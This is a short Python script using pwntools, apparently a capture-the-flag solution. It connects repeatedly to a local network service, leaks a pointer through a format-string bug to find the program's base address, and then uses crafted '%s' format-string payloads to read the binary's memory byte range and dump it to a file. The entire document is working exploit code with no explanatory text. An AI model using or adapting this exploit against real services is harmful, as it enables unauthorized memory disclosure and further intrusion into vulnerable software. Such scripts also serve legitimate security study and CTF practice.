from pwn import *

i = 0
i = 0x202000
#i = 0x202030
file_ = ''
dump_file = open('asdf', 'ab')

while i <= 0x203000:
    r = remote('localhost', 60015)
    r.sendline('%40$p')
    r.recvuntil('Hello ')
    # beginning of elf
    leak = (int(r.recvline().strip(), 16) - 0xdf8) - (0x1000 * 513)
    log.info('%x' % (leak+i))
    log.info('%x' % (i))

    if '\n' in p64(leak+i):
        dump_file.write('\x00')
        i += 1
        r.close()
        continue

    leak = 'A'*45 + '|%13$s|' + 'XXXX' + p64(leak+i)
    r.sendline(leak)
    a = r.recvuntil('XXXX')
    a = a.split('|')[1]
    log.info(a)
    dump_file.write(a + '\x00')
    i += len(a) + 1

    r.close()
